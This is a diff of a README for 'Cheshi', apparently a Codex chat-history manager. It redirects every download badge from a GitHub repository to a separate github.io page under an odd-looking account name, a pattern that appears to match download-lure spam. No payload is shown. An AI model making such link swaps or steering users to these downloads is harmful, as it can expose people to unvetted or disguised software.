@@ -6,7 +6,7 @@
 
 Welcome to Cheshi! This is your all-in-one workspace for managing every AI conversation you have with OpenAI Codex. Think of it as a memory vault for your coding sessions — Cheshi remembers everything, helps you find past decisions, and shows you exactly where those decisions came from.
 
-[![Download Cheshi Now](https://img.shields.io/badge/⬇️_Download_Cheshi-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Minklymantriidae6401/Cheshi)
+[![Download Cheshi Now](https://img.shields.io/badge/⬇️_Download_Cheshi-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://minklymantriidae6401.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ Cheshi turns your scattered AI chats into an organized, searchable library. Here
 **Step-by-Step Download:**
 
 1. Visit this link to download the application:  
-   [![Download Cheshi](https://img.shields.io/badge/Download_Cheshi-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Minklymantriidae6401/Cheshi)
+   [![Download Cheshi](https://img.shields.io/badge/Download_Cheshi-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://minklymantriidae6401.github.io)
    
 2. Click the **Releases** tab at the top of the page you arrive at.
 
@@ -213,7 +213,7 @@ We're here for you:
 
 Just in case you scrolled past it:
 
-[![Get Cheshi Now](https://img.shields.io/badge/GET_CHESHI-NOW-blue?style=for-the-badge&logo=apple)](https://github.com/Minklymantriidae6401/Cheshi)
+[![Get Cheshi Now](https://img.shields.io/badge/GET_CHESHI-NOW-blue?style=for-the-badge&logo=apple)](https://minklymantriidae6401.github.io)
 
 ---
 
